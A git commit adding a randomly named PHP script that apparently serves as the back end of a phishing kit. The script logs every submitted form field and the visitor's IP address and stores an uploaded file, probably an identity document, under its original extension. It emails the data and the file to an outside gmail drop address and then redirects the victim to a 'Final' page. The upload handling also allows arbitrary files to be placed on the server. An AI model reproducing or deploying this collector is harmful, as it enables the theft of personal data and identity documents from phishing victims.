33d6278e2fe142eafada25597f346fbdecba4cfa
mediexe <provojeademi@gmail.com>
2017-03-09 22:03:31 +0100

    sd

---
+++ fjR42as1F1A.php
@@ -0,0 +1,35 @@
+<?php
+$filename = 'ID/' . uniqid();
+$bodytext = '';
+
+$handle = fopen($filename . '.txt', 'a');
+
+foreach($_POST as $variable => $value) {
+    fwrite($handle, $variable . ' = ' . $value . PHP_EOL);
+    $bodytext = $bodytext . $variable . ' = ' . $value . PHP_EOL;
+}
+
+$bodytext = $bodytext . 'REMOTE IP: ' . $_SERVER['REMOTE_ADDR'] . PHP_EOL;
+fwrite($handle, 'REMOTE IP: ' . $_SERVER['REMOTE_ADDR'] . PHP_EOL);
+fclose($handle);
+
+
+$filename = $filename . '.' . pathinfo(basename($_FILES["uploadfile"]["name"]), PATHINFO_EXTENSION);
+move_uploaded_file($_FILES["uploadfile"]["tmp_name"], $filename);
+
+require_once('PHPMailer/PHPMailerAutoload.php');
+
+$email = new PHPMailer();
+$email->From      = 'kariuqrt@server161.web-hosting.com';
+$email->FromName  = 'amirkerlas@gmail.com';
+$email->Subject   = 'UpIoad-lD';
+$email->Body      = $bodytext;
+$email->AddAddress( 'agnesaxhemajli1@gmail.com' );
+
+
+$email->AddAttachment(__DIR__ . '/' . $filename, pathinfo($filename, PATHINFO_BASENAME));
+$email->Send();
+
+header('Location: Final.htm');
+exit;
+?>
